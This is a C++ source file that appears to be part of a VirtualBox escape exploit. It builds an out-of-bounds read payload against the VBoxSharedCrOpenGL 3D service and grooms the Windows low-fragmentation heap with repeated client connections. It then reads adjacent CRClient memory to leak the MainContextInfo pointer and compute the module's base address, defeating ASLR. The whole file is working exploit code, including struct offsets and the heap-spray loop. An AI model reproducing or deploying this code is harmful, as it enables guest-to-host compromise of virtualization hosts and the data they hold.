#include "oob-read.h"
#include "misc.h"
#include "chromium.h"

#define LFH_TRIGGER_ALLOCATIONS				0x10

/*
VBoxSharedCrOpenGL!_crclient
   +0x000 spu_id           : Int4B
   +0x008 conn             : Ptr64 CRConnection
   +0x010 number           : Int4B                  -> corresponds to client id
   +0x018 pid              : Uint8B
   +0x020 currentContextNumber : Int4B
   +0x028 currentCtxInfo   : Ptr64 CRContextInfo
   +0x030 currentWindow    : Int4B
   +0x038 currentMural     : Ptr64 CRMuralInfo
   +0x040 windowList       : [100] Int4B
   +0x1d0 contextList      : [512] Int4B
*/

// the offset from the cr_unpackData pointer to where the
// cr_server.MainContextInfo pointer would be if the adjacent
// object is a CRClient object
//  0xA10 = 0x9D0 (object size) + 0x30 (lfh header)
//  0x10  = cr_unpackData is 0x10 into chromium message
//  0x20  = currentContextNumber is 0x20 into CRClient,
//          followed by currentContext (we leak both)
#define MAINCONTEXTINFO_OFFSET  (0xA10 - 0x10 + 0x20)
#define CRCLIENT_SIZE   0x9D0
#define MASH_ATTEMPTS   0x1000

// when the response message is defined as uint64_t*, the
// following indices can be used to read the return_ptr and
// the writeback_ptr
#define WRITEBACK_PTR_OFFSET    0x1
#define RETURN_PTR_OFFSET       0x2

uint32_t* oob_read::create_oob_payload(uint32_t packet_length, uint32_t size) {

    if (size < 8*4) return NULL;

    uint32_t* oob_payload = (uint32_t*)calloc(size, 1);

    oob_payload[0] = CR_MESSAGE_OPCODES;
    oob_payload[1] = 0x00;
    oob_payload[2] = 0x01;
    oob_payload[3] = (uint32_t)CR_EXTEND_OPCODE << 24;
    oob_payload[4] = packet_length;
    oob_payload[5] = CR_GETATTRIBLOCATION_EXTEND_OPCODE;

    oob_payload[6] = 0x41414141;
    oob_payload[7] = 0x42424242;
    oob_payload[8] = 0x43434343;
    oob_payload[9] = 0x44444444;

    return oob_payload;
}

uint64_t oob_read::leak_MainContextInfo(uint64_t crserver_maincontextinfo_offset) {
    uint32_t u32ClientId = vbox3d::connect();
    uint64_t addr_vboxsharedcropengl = 0;

    // since we'll be looping quite a lot later, we want to create this stuff now
    // to avoid allocating all of the memory in the world
    uint32_t packet_length = (MAINCONTEXTINFO_OFFSET + 16);
    uint32_t* oob_payload = oob_read::create_oob_payload(packet_length, CRCLIENT_SIZE);
    uint32_t *recvbuf = (uint32_t*)calloc(CRCLIENT_SIZE+0x100, 1);


    LOG_INFO_INDENT( 1, "performing initial heap manipulation");
    uint32_t u32ClientIds[CR_MAX_CLIENTS];
    for (int i = 0; i < CR_MAX_CLIENTS; i++) u32ClientIds[i] = 0x00;

    // first, we trigger lfh
    for (int i = 0; i < LFH_TRIGGER_ALLOCATIONS; i++) {
        u32ClientIds[i] = vbox3d::connect();
    }
    for (int i = 0; i < LFH_TRIGGER_ALLOCATIONS; i++) {
        vbox3d::disconnect(u32ClientIds[i]);
    }

retry:
    // here we create connections until we can't create connections anymore
    for (int i = 0; i < CR_MAX_CLIENTS; i++) {
        u32ClientIds[i] = vbox3d::connect();

        // check if connection failed
        if (u32ClientIds[i] == 0x00) break;
    }

    LOG_INFO_INDENT( 1, "mashing x");

    uint32_t iBuffer;
    uint64_t return_ptr, writeback_ptr;
    for (int i = 0; i < MASH_ATTEMPTS; i++) {

        iBuffer = vbox3d::hgcm_write_buffer_create(u32ClientId, CRCLIENT_SIZE, (uint8_t*)oob_payload, CRCLIENT_SIZE);

        vbox3d::hgcm_read_buffered(u32ClientId, iBuffer, (uint8_t*)recvbuf, CRCLIENT_SIZE);

        return_ptr = ((uint64_t*)recvbuf)[RETURN_PTR_OFFSET];
        writeback_ptr = ((uint64_t*)recvbuf)[WRITEBACK_PTR_OFFSET];

        // check 1 - currentContextNumber is initialised to -1 in crVBoxServerAddClient
        //      newClient->currentContextNumber = -1;
        if (return_ptr != 0xffffffff) continue;

        // check 2 - the assumption is that the upper dword will have the format 0x00007ff0
        if ( (writeback_ptr>>32) & 0x00007ff0 != 0x00007ff0) continue;

        // check 3 - check if subtracting the offset from the lower dword results in an address 
        //          that is aligned to 0x10000
        if ( ((writeback_ptr & 0xffffffff) & 0xffff) - (crserver_maincontextinfo_offset & 0xffff) != 0 ) continue;

        // if we made it to here, then we are potentially in possession of the cr_server.MainContextInfo
        // pointer
        addr_vboxsharedcropengl = writeback_ptr - crserver_maincontextinfo_offset;
        LOG_SUCCESS_INDENT( 1, "VBoxSharedCrOpenGL => " + to_hex_str((void*)addr_vboxsharedcropengl));
        break;
    }

    for (auto i: u32ClientIds) {
        if (i == 0) break;
        vbox3d::disconnect(i);
    }

    if (addr_vboxsharedcropengl == 0x00) goto retry;

    free(recvbuf);
    free(oob_payload);

    vbox3d::disconnect(u32ClientId);
    return addr_vboxsharedcropengl;

    return 0;
}